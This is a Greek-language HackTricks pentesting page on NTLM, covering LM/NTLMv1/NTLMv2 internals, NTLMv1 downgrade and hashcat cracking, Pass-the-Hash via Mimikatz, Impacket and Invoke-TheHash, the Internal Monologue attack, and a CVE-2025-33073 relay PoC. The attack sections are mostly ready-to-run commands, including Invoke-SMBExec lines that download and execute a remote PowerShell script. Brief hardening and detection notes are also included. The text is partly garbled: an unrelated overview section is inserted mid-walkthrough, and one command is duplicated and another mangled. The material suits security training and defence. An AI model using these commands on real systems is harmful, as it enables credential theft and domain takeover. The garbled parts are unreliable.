# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

Σε περιβάλλοντα όπου λειτουργούν τα **Windows XP και Server 2003**, χρησιμοποιούνται LM (Lan Manager) hashes, αν και είναι ευρέως γνωστό ότι μπορούν να παραβιαστούν εύκολα. Ένα συγκεκριμένο LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, υποδεικνύει μια περίπτωση όπου το LM δεν χρησιμοποιείται, και αντιστοιχεί στο hash για κενή συμβολοσειρά.

Από προεπιλογή, το πρωτόκολλο αυθεντικοποίησης **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) ενεργοποιείται κάτω από συγκεκριμένες συνθήκες: απουσία Active Directory, μη ύπαρξη του domain, δυσλειτουργία του Kerberos λόγω λανθασμένης ρύθμισης, ή όταν οι συνδέσεις επιχειρούνται χρησιμοποιώντας IP address αντί για έγκυρο hostname.

Η παρουσία της κεφαλίδας **"NTLMSSP"** στα network packets σηματοδοτεί διαδικασία αυθεντικοποίησης NTLM.

Η υποστήριξη για τα πρωτόκολλα αυθεντικοποίησης - LM, NTLMv1, και NTLMv2 - παρέχεται από ένα συγκεκριμένο DLL που βρίσκεται στο `%windir%\Windows\System32\msv1\_0.dll`.

**Σημεία-Κλειδιά**:

- Τα LM hashes είναι ευάλωτα και ένα κενό LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) σημαίνει ότι δεν χρησιμοποιείται.
- Το Kerberos είναι η προεπιλεγμένη μέθοδος αυθεντικοποίησης, με το NTLM να χρησιμοποιείται μόνο υπό ορισμένες συνθήκες.
- Τα NTLM authentication packets αναγνωρίζονται από την κεφαλίδα "NTLMSSP".
- Τα πρωτόκολλα LM, NTLMv1, και NTLMv2 υποστηρίζονται από το system file `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

Μπορείς να ελέγξεις και να ρυθμίσεις ποιο πρωτόκολλο θα χρησιμοποιηθεί:

### GUI

Εκτέλεσε _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Υπάρχουν 6 επίπεδα (από 0 έως 5).

![](<../../images/image (919).png>)

### Registry

Αυτό θα ορίσει το επίπεδο 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Πιθανές τιμές:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Βασικό NTLM Domain σχήμα authentication

1. Ο **user** εισάγει τα **credentials** του
2. Το client machine **στέλνει ένα authentication request** στέλνοντας το **domain name** και το **username**
3. Ο **server** στέλνει το **challenge**
4. Ο **client encrypts** το **challenge** χρησιμοποιώντας το hash του password ως key και το στέλνει ως response
5. Ο **server στέλνει** στο **Domain controller** το **domain name, the username, the challenge and the response**. Αν **δεν υπάρχει** configured Active Directory ή το domain name είναι το όνομα του server, τα credentials **ελέγχονται τοπικά**.
6. Ο **domain controller ελέγχει αν όλα είναι σωστά** και στέλνει τις πληροφορίες στον server

Ο **server** και ο **Domain Controller** μπορούν να δημιουργήσουν ένα **Secure Channel** μέσω του **Netlogon** server καθώς ο Domain Controller γνωρίζει το password του server (βρίσκεται μέσα στη βάση **NTDS.DIT**).

### Local NTLM authentication Scheme

Το authentication είναι όπως το **προηγούμενο αλλά** ο **server** γνωρίζει το **hash του user** που προσπαθεί να authenticate μέσα στο αρχείο **SAM**. Άρα, αντί να ρωτάει τον Domain Controller, ο **server θα ελέγξει μόνος του** αν ο user μπορεί να authenticate.

### NTLMv1 Challenge

Το **challenge length is 8 bytes** και το **response is 24 bytes** long.

Το **hash NT (16bytes)** χωρίζεται σε **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): το **last part is filled with zeros**. Έπειτα, το **challenge** **ciphered separately** με κάθε part και τα **resulting** ciphered bytes **joined**. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Lack of **randomness**
- Τα 3 parts μπορούν να **attacked separately** για να βρεθεί το NT hash
- Το **DES is crackable**
- Το 3º key is composed always by **5 zeros**.
- Given the **same challenge** the **response** θα είναι **same**. Άρα, μπορείς να δώσεις ως **challenge** στο θύμα το string "**1122334455667788**" και να attack the response χρησιμοποιώντας **precomputed rainbow tables**.

### NTLMv1 attack

Σήμερα είναι όλο και λιγότερο συνηθισμένο να βρίσκουμε environments με Unconstrained Delegation configured, αλλά αυτό δεν σημαίνει ότι δεν μπορείς να **abuse a Print Spooler service** configured.

Μπορείς να abuse κάποια credentials/sessions που ήδη έχεις στο AD για να **ask the printer to authenticate** against some **host under your control**. Έπειτα, χρησιμοποιώντας `metasploit auxiliary/server/capture/smb` ή `responder` μπορείς να **set the authentication challenge to 1122334455667788**, να capture το authentication attempt, και αν έγινε χρησιμοποιώντας **NTLMv1** θα μπορέσεις να το **crack it**.\
Αν χρησιμοποιείς `responder` μπορείς να δοκιμάσεις να **use the flag `--lm`** για να προσπαθήσεις να **downgrade** το **authentication**.\
_Σημείωση ότι για αυτή την τεχνική το authentication πρέπει να γίνει χρησιμοποιώντας NTLMv1 (NTLMv2 is not valid)._

Θυμήσου ότι ο printer θα χρησιμοποιήσει το computer account κατά τη διάρκεια του authentication, και τα computer accounts χρησιμοποιούν **long and random passwords** που **πιθανότατα δεν θα μπορέσεις να crack** χρησιμοποιώντας common **dictionaries**. Όμως, το **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), οπότε χρησιμοποιώντας κάποιες υπηρεσίες ειδικά αφιερωμένες στο cracking DES θα μπορέσεις να το crack it (μπορείς να χρησιμοποιήσεις [https://crack.sh/](https://crack.sh) ή [https://ntlmv1.com/](https://ntlmv1.com) για παράδειγμα).

### NTLMv1 attack with hashcat

Το NTLMv1 μπορεί επίσης να σπάσει με το NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) το οποίο μορφοποιεί τα NTLMv1 messages im a method that can be broken with hashcat.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
θα έδινε το παρακάτω:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Χρησιμοποιήστε το ακόλουθο ως περιεχόμενο του αρχείου:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Τρέξτε το hashcat (το distributed είναι καλύτερο μέσω ενός tool όπως το hashtopolis) καθώς διαφορετικά αυτό θα πάρει αρκετές ημέρες.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Σε αυτήν την περίπτωση ξέρουμε ότι το password για αυτό είναι password, οπότε θα κάνουμε cheat για λόγους demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Τώρα πρέπει να χρησιμοποιήσουμε τα hashcat-utilities για να μετατρέψουμε τα cracked des keys σε μέρη του NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Τέλος, το τελευταίο μέρος:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM

NTLM (NT LAN Manager) είναι ένα σύνολο challenge-response authentication protocols που χρησιμοποιούνται για να παρέχουν authentication σε users, processes, και υπολογιστές σε δίκτυα που βασίζονται σε Microsoft Windows. Είναι το πρωτόκολλο που χρησιμοποιείται ευρέως σε domain environments για να αποδείξει την ταυτότητα ενός client σε έναν server χωρίς να στέλνει το password σε plaintext.

Στον χώρο του hacking, το NTLM είναι σημαντικό επειδή μπορεί να καταχραστεί με διάφορους τρόπους για να αποκτηθούν credentials, να γίνει relay authentication, ή να εκτελεστούν lateral movement techniques. Κοινές επιθέσεις περιλαμβάνουν NTLM relay, NTLM hash cracking, και credential capture μέσω techniques όπως LLMNR/NBT-NS poisoning.

## NTLM Authentication Flow

Το NTLM authentication flow περιλαμβάνει συνήθως τα παρακάτω βήματα:

1. Ο client στέλνει ένα negotiation message στον server.
2. Ο server απαντά με ένα challenge.
3. Ο client στέλνει ένα authenticate message που περιέχει την απάντηση στο challenge, βασισμένη στο password hash του χρήστη.
4. Ο server επαληθεύει την απάντηση χρησιμοποιώντας το αποθηκευμένο hash ή μέσω domain controller.

Επειδή το NTLM βασίζεται σε hashes και όχι σε απλή αποστολή του password, θεωρείται πιο ασφαλές από την καθαρή μεταφορά credentials. Ωστόσο, παραμένει ευάλωτο σε relay και pass-the-hash τύπου attacks.

## Επιθέσεις και Κατάχρηση

- **NTLM relay**: Ο attacker παρεμβάλλεται μεταξύ client και server και προωθεί το authentication σε έναν άλλο στόχο.
- **Pass-the-Hash**: Χρήση του NTLM hash αντί για το κανονικό password για authentication.
- **Password cracking**: Αν αποκτηθεί το NTLM hash, μπορεί να γίνει offline cracking.
- **Credential capture**: Μέσω poisoning ή άλλων methods μπορεί να κλαπεί NTLM authentication material.

## Άμυνα και Hardening

Για να μειωθεί ο κίνδυνος από NTLM abuse:

- Απενεργοποιήστε το NTLM όπου είναι δυνατό.
- Χρησιμοποιήστε Kerberos αντί για NTLM όταν γίνεται.
- Ενεργοποιήστε SMB signing και LDAP signing.
- Περιορίστε το LLMNR και το NBT-NS.
- Χρησιμοποιήστε multifactor authentication όπου είναι δυνατό.

## Σημείωση

Το NTLM παραμένει σημαντικό σε legacy environments και σε περιβάλλοντα όπου η συμβατότητα με παλαιότερα συστήματα είναι απαραίτητη. Για αυτόν τον λόγο, η κατανόηση του τρόπου λειτουργίας του είναι κρίσιμη τόσο για offensive όσο και για defensive security work.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Το **μήκος του challenge είναι 8 bytes** και **2 responses αποστέλλονται**: Το ένα έχει μήκος **24 bytes** και το μήκος του **άλλου** είναι **variable**.

Το **πρώτο response** δημιουργείται με κρυπτογράφηση με χρήση **HMAC_MD5** της **string** που αποτελείται από τον **client και το domain** και χρησιμοποιώντας ως **key** το **hash MD4** του **NT hash**. Έπειτα, το **result** θα χρησιμοποιηθεί ως **key** για να κρυπτογραφήσει με χρήση **HMAC_MD5** το **challenge**. Σε αυτό, θα προστεθεί **ένα client challenge 8 bytes**. Σύνολο: 24 B.

Το **δεύτερο response** δημιουργείται χρησιμοποιώντας **several values** (ένα νέο client challenge, ένα **timestamp** για να αποφευχθούν **replay attacks**...)

Αν έχεις ένα **pcap που έχει καταγράψει ένα επιτυχημένο authentication process**, μπορείς να ακολουθήσεις αυτόν τον οδηγό για να πάρεις το domain, username , challenge και response και να προσπαθήσεις να creak το password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Μόλις έχεις το hash του θύματος**, μπορείς να το χρησιμοποιήσεις για να **impersonate** το.\
Πρέπει να χρησιμοποιήσεις ένα **tool** που θα **perform** το **NTLM authentication using** αυτό το hash, **ή** μπορείς να δημιουργήσεις ένα νέο **sessionlogon** και να **inject** αυτό το hash μέσα στο **LSASS**, έτσι ώστε όταν πραγματοποιείται οποιοδήποτε **NTLM authentication**, να χρησιμοποιείται αυτό το hash. Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.

**Παρακαλώ, θυμήσου ότι μπορείς να εκτελέσεις επιθέσεις Pass-the-Hash και χρησιμοποιώντας Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Αυτό θα εκκινήσει μια διεργασία που θα ανήκει στους χρήστες που έχουν εκτελέσει το mimikatz, αλλά εσωτερικά στο LSASS τα αποθηκευμένα credentials είναι αυτά που βρίσκονται στις παραμέτρους του mimikatz. Έπειτα, μπορείς να αποκτήσεις πρόσβαση σε network resources σαν να ήσουν αυτός ο χρήστης (παρόμοιο με το `runas /netonly` trick, αλλά δεν χρειάζεται να ξέρεις το plain-text password).

### Pass-the-Hash from linux

Μπορείς να αποκτήσεις code execution σε Windows machines χρησιμοποιώντας Pass-the-Hash από Linux.\
[**Πρόσβαση εδώ για να μάθεις πώς να το κάνεις.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Μπορείς να κατεβάσεις[ impacket binaries for Windows εδώ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Σε αυτή την περίπτωση πρέπει να καθορίσεις μια εντολή, τα cmd.exe και powershell.exe δεν είναι έγκυρα για να αποκτήσεις ένα interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Υπάρχουν αρκετά ακόμη Impacket binaries...

### Invoke-TheHash

Μπορείς να πάρεις τα powershell scripts από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Αυτή η συνάρτηση είναι ένα **μείγμα όλων των άλλων**. Μπορείς να περάσεις **πολλούς hosts**, να **εξαιρέσεις** κάποιους και να **επιλέξεις** την **option** που θέλεις να χρησιμοποιήσεις (_SMBExec, WMIExec, SMBClient, SMBEnum_). Αν επιλέξεις **οποιοδήποτε** από τα **SMBExec** και **WMIExec** αλλά **δεν** δώσεις κάποια παράμετρο _**Command**_ θα απλώς **ελέγξει** αν έχεις **αρκετά permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Πρέπει να εκτελεστεί ως administrator**

Αυτό το εργαλείο θα κάνει το ίδιο πράγμα με το mimikatz (τροποποίηση της μνήμης LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Χειροκίνητη απομακρυσμένη εκτέλεση Windows με username και password


{{#ref}}
../lateral-movement/
{{#endref}}

## Εξαγωγή credentials από έναν Windows Host

**Για περισσότερες πληροφορίες σχετικά με το** [**πώς να αποκτήσετε credentials από έναν Windows host θα πρέπει να διαβάσετε αυτή τη σελίδα**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Επίθεση Internal Monologue

Η επίθεση Internal Monologue είναι μια stealthy τεχνική εξαγωγής credentials που επιτρέπει σε έναν attacker να ανακτήσει NTLM hashes από το μηχάνημα του θύματος **χωρίς άμεση αλληλεπίδραση με τη διεργασία LSASS**. Σε αντίθεση με το Mimikatz, το οποίο διαβάζει hashes απευθείας από τη μνήμη και συχνά μπλοκάρεται από endpoint security solutions ή Credential Guard, αυτή η επίθεση αξιοποιεί **τοπικές κλήσεις στο NTLM authentication package (MSV1_0) μέσω του Security Support Provider Interface (SSPI)**. Ο attacker πρώτα **υποβαθμίζει τις ρυθμίσεις NTLM** (π.χ. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ώστε να διασφαλίσει ότι το NetNTLMv1 επιτρέπεται. Έπειτα impersonate υπάρχοντα user tokens που έχουν ληφθεί από running processes και ενεργοποιεί τοπικά NTLM authentication για να παραγάγει NetNTLMv1 responses χρησιμοποιώντας ένα γνωστό challenge.

Αφού καταγράψει αυτά τα NetNTLMv1 responses, ο attacker μπορεί γρήγορα να ανακτήσει τα αρχικά NTLM hashes χρησιμοποιώντας **precomputed rainbow tables**, επιτρέποντας περαιτέρω Pass-the-Hash attacks για lateral movement. Κρίσιμο είναι ότι η επίθεση Internal Monologue παραμένει stealthy επειδή δεν δημιουργεί network traffic, δεν inject code, ούτε ενεργοποιεί direct memory dumps, καθιστώντας την πιο δύσκολη στην ανίχνευση από τους defenders σε σύγκριση με παραδοσιακές μεθόδους όπως το Mimikatz.

Αν το NetNTLMv1 δεν γίνει αποδεκτό—λόγω επιβαλλόμενων security policies—τότε ο attacker μπορεί να αποτύχει να ανακτήσει ένα NetNTLMv1 response.

Για να αντιμετωπιστεί αυτή η περίπτωση, το εργαλείο Internal Monologue ενημερώθηκε: αποκτά δυναμικά ένα server token χρησιμοποιώντας `AcceptSecurityContext()` ώστε να εξακολουθεί να **capture NetNTLMv2 responses** αν το NetNTLMv1 αποτύχει. Αν και το NetNTLMv2 είναι πολύ πιο δύσκολο να crack, εξακολουθεί να ανοίγει δρόμο για relay attacks ή offline brute-force σε περιορισμένες περιπτώσεις.

Το PoC βρίσκεται στο **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay και Responder

**Διαβάστε πιο αναλυτικό οδηγό για το πώς να εκτελέσετε αυτές τις επιθέσεις εδώ:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges από network capture

**Μπορείτε να χρησιμοποιήσετε** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* μέσω Serialized SPNs (CVE-2025-33073)

Τα Windows περιέχουν αρκετές mitigations που προσπαθούν να αποτρέψουν *reflection* attacks όπου ένα NTLM (ή Kerberos) authentication που προέρχεται από έναν host αναμεταδίδεται πίσω στο **ίδιο** host για να αποκτηθούν δικαιώματα SYSTEM.

Η Microsoft έσπασε τις περισσότερες δημόσιες αλυσίδες με τα MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) και μετέπειτα patches, ωστόσο το **CVE-2025-33073** δείχνει ότι οι protections μπορούν ακόμη να παρακαμφθούν με κατάχρηση του τρόπου με τον οποίο ο **SMB client truncates Service Principal Names (SPNs)** που περιέχουν *marshalled* (serialized) target-info.

### TL;DR του bug
1. Ένας attacker καταχωρεί ένα **DNS A-record** του οποίου το label κωδικοποιεί ένα marshalled SPN – π.χ.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Το θύμα εξαναγκάζεται να authenticate σε αυτό το hostname (PetitPotam, DFSCoerce, κ.λπ.).
3. Όταν ο SMB client περνά το target string `cifs/srv11UWhRCAAAAA…` στο `lsasrv!LsapCheckMarshalledTargetInfo`, η κλήση στο `CredUnmarshalTargetInfo` **strips** το serialized blob, αφήνοντας **`cifs/srv1`**.
4. Το `msv1_0!SspIsTargetLocalhost` (ή το αντίστοιχο Kerberos) τώρα θεωρεί ότι ο target είναι *localhost* επειδή το σύντομο host part ταιριάζει με το computer name (`SRV1`).
5. Κατά συνέπεια, ο server ορίζει `NTLMSSP_NEGOTIATE_LOCAL_CALL` και injects το **LSASS’ SYSTEM access-token** στο context (για Kerberos δημιουργείται ένα SYSTEM-marked subsession key).
6. Το relaying αυτής της authentication με `ntlmrelayx.py` **ή** `krbrelayx.py` δίνει πλήρη δικαιώματα SYSTEM στον ίδιο host.

### Γρήγορο PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* Η KB patch για το **CVE-2025-33073** προσθέτει έναν έλεγχο στο `mrxsmb.sys::SmbCeCreateSrvCall` που μπλοκάρει οποιαδήποτε SMB σύνδεση της οποίας ο στόχος περιέχει marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Ενεργοποίησε **SMB signing** για να αποτρέψεις reflection ακόμη και σε unpatched hosts.
* Παρακολούθησε DNS records που μοιάζουν με `*<base64>...*` και μπλόκαρε coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Network captures με `NTLMSSP_NEGOTIATE_LOCAL_CALL` όπου το client IP ≠ server IP.
* Kerberos AP-REQ που περιέχει subsession key και client principal ίσο με το hostname.
* Windows Event 4624/4648 SYSTEM logons αμέσως πριν από remote SMB writes από το ίδιο host.

Για τη variant τοπικού reflection του **March 2026** που κάνει abuse σε **SMB arbitrary ports** και **TCP connection reuse** για να φτάσει στο `NT AUTHORITY\SYSTEM`, δες:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
